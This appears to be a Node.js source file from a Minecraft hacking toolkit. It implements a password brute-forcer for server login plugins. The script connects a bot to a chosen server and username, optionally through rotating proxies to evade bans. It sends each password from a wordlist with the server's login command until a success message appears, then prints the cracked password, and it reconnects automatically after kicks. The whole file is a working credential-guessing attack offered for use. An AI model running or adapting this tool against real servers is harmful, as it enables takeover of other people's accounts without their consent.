const utils = require('./utils');
const fs = require('fs');

if (process.argv.length < 5) {
    utils.coloredText('Usage: node login.js <host> <port> <username> <version> <passwordFile> <spaces> [<proxyFile>]');
    process.exit(1);
}

const host = process.argv[2];
const port = process.argv[3];
const username = process.argv[4];
const version = process.argv[5];
const passwordFile = process.argv[6];
const spaces = process.argv[7];
const proxyFile = process.argv[8];
const passwords = utils.getListOfPasswords(passwordFile);

if (passwords === null) {
    utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe entered password file is not valid.`);
    process.exit(1);
}

if (proxyFile) {
    let proxyTest = utils.getListOfPasswords(proxyFile);

    if (proxyTest === null) {
        utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe entered proxy file (§c${proxyFile}§f) is not valid.`);
        process.exit(1);
    }
}

function getSpaces(spaces) {
    return utils.getSpaces(spaces);
}

process.on('uncaughtException', (error) => {
    utils.handleBotCreationError(error, spaces);
    process.exit(1);
});

let attempts = 0;
let settingsData = fs.readFileSync('config/bruteforce_config.json');
let settingsJson = JSON.parse(settingsData);
const loginCommand = settingsJson.login.loginCommand;
const reconnectDelay = settingsJson.login.reconnect;
const wordsToLogin = settingsJson.login.wordsToLogin;
const wordsAtLogin = settingsJson.login.wordsAtLogin;

function createBot(proxy = null) {
    let bot;

    try {
        bot = utils.createBotInstance({
            host,
            port,
            username,
            version,
            proxy,
            connectTimeout: 5000,
            onProxyError: () => {
                utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §cThe proxy server the bot connected to did not respond. Trying to connect with another proxy..`);
                sendBot();
            }
        });
    } catch (error) {
        utils.handleBotCreationError(error, spaces);
        process.exit(1);
    }

    bot.on('login', () => {
        utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §aThe bot has connected to the server.`);
    });

    bot.on('message', (message) => {
        let serverMessage = message.toString().toLowerCase();

        if (attempts >= passwords.length) {
            setTimeout(() => {
                utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §cThe password is not found in the password list.`);
                bot.quit();
                process.exit(1);
            }, 1000);
        }

        for (const word of wordsAtLogin) {
            if (serverMessage.includes(word)) {
                utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe password of the §a${username} §fuser is: §a${passwords[attempts - 1]}`);
                bot.quit();
                process.exit(1);
            }
        }

        for (const word of wordsToLogin) {
            if (serverMessage.includes(word) && attempts < passwords.length) {
                bot.chat(`${loginCommand} ${passwords[attempts]}`);
                utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fTesting the password: §a${passwords[attempts]}`);
                attempts += 1;
            }
        }
    });

    bot.on('kicked', (reason) => {
        const message = utils.formatKickReason(reason).replace(/"/g, '');
        utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §c${message}`);

        bot.quit();
        setTimeout(() => {
            sendBot();
        }, reconnectDelay);
    });

    bot.on('error', (_) => {
        utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §cThe bot was forced to disconnect.`);
        bot.quit();
        setTimeout(() => {
            sendBot();
        }, reconnectDelay);
    });
}

function sendBot() {
    if (proxyFile) {
        const randomProxy = utils.getProxy(proxyFile);

        if (randomProxy) {
            utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §aSending the bot to the server.. §f§l(§d${randomProxy[0]}:${randomProxy[1]}§f§l)`);
            createBot(randomProxy);
        } else {
            utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] Invalid Proxy: ${proxyFile}`);
        }
    } else {
        utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §aSending the bot to the server.. §f§l(§cNo proxy§f§l)`);
        createBot();
    }
}

sendBot();
